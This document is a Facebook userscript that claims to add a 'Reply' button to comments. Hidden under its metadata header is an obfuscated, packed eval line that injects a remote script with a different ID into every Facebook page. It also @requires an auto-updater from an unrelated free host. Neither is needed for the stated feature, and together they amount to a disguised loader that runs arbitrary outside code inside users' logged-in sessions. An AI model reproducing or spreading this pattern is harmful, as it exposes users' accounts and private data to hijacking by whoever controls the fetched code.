// ==UserScript==
// @name           facebook.com - Reply button Plus + Last Update
// @version        1.8
// @description    Add a reply button to comments
// @namespace      Kub4jz.cz
// @require        http://buzzy.hostoi.com/AutoUpdater.js

// @include        http://www.facebook.com/*
// @include        https://www.facebook.com/*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @match          http://www.facebook.com/*
// @match          https://www.facebook.com/*

// @exclude        htt*://*.facebook.com/login.php
// @exclude        htt*://*.facebook.com/sharer*
// @exclude        htt*://*.facebook.com/ajax/*
// @exclude        htt*://*.facebook.com/plugins/*
// @exclude        htt*://*.facebook.com/ai.php*

// @exclude        htt*://apps.facebook.com/*
// @exclude        htt*://*.facebook.com/apps/*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


(function(d){

    var DEBUG = false;


    var script = {
        id: 49378,
        version: '1.8'
    }


    var gm_class = ' gm_reply_button';

    var button_text;
    var last_insert;


    var text = {
        en: 'Reply',
        cs: 'Reagovat'
    }


    function log(text)
    {
        if (DEBUG === true && typeof GM_log === 'function' && text !== '') {
            GM_log(text);
        }
        return false;
    }


    function getButtonText()
    {
        // get lang
        var lang = d.getElementsByTagName('html')[0].getAttribute('lang');

        return text[lang] ? text[lang] : text.en;
    }


//     function simulateKeyEvent(keyCodeArg, element)
//     {
//         var evt = document.createEvent("KeyboardEvent");
//                   evt.initKeyEvent ("keypress", true, true, window,
//                   0, 0, 0, 0,
//                   keyCodeArg, 0);
//
//         element.dispatchEvent(evt);
//
//         return false;
//     }


    /**
     * insert name to textarea
     */
    function insertName(evt)
    {
        evt.preventDefault();

        try {
            var parent = evt.target.parentNode.parentNode;

            var link = parent.getElementsByClassName('actorName')[0],
                string = link.textContent;

            var name = [];
                name = string.split(' ');
            var first_name = name[0];

            insert_text = '@' + first_name + ': ';

            var commentsWrapper = parent.parentNode;

            var i = 0;
            while (i < 10 && commentsWrapper.tagName !== 'ul' && commentsWrapper.className.indexOf('uiList uiUfi') == -1) {
                commentsWrapper = commentsWrapper.parentNode;
                i++;
            }

            var textarea = commentsWrapper.getElementsByTagName('textarea')[0];
                textarea.focus();


            if (textarea.value == '') last_insert = null;


            if (string != last_insert) {
                var pretext  = textarea.value.substring(0, textarea.selectionStart),
                    posttext = textarea.value.substring(textarea.selectionEnd, textarea.value.length);

                textarea.value = pretext + insert_text + posttext;

//                 simulateKeyEvent(39, textarea);

                last_insert = string;
            }
        } catch (e) {
            log(e);
        }

        return false;
    }


    /**
     * Add reply buttons to comments
     */
    function addButtons(parentNode)
    {
        try {
            parentNode = parentNode||d;

            var divs = parentNode.getElementsByClassName('commentActions');
            var div;

            for (i = 0; i <= divs.length-1; i++) {
                div = divs[i];

                if (div.className.indexOf(gm_class) >= 0) {
                    if (!!(button = div.getElementsByClassName('replyButton')[0])) {
                        button.addEventListener('click', insertName, false);
                    }

                    continue;
                }

                div.className += gm_class;

                // create & add reply button
                var button = d.createElement('a');
                    button.setAttribute('class', 'replyButton');
                    button.innerHTML = button_text;

                    button.addEventListener('click', insertName, false);

                // add separator
                div.innerHTML += ' · ';

                div.insertBefore(button, null);
            }
        } catch (e) {
            log(e);
        }

        return false;
    }



    function afterDomNodeInserted(e)
    {
        var target = e.target;

        if (target.nodeName == 'LI') {
            addButtons(target);
        }

        return false;
    }


    /* Start Script */
    if (!!(content = d.getElementById('content'))) {

        button_text = getButtonText();
        addButtons();

        setTimeout(function() {
            content.addEventListener(
                'DOMNodeInserted',
                afterDomNodeInserted,
                false
            );
        }, 2000);
    }


    /* AutoUpdater */
    if (typeof autoUpdate == 'function') {
        autoUpdate (script.id, script.version);
    }

})(document);